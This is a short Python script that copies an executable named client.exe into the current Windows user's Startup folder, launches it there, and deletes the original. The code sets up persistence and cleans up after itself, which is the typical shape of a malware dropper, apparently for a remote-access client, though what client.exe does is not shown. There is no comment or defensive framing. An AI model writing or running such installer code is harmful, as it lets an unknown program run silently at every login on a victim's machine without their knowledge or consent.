import shutil
import os
print("C:/Users/%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/client.exe" % os.getlogin())
shutil.copy("./client.exe", "C:/Users/%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/client.exe" % os.getlogin())
os.startfile("C:/Users/%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/client.exe" % os.getlogin())
os.remove("./client.exe")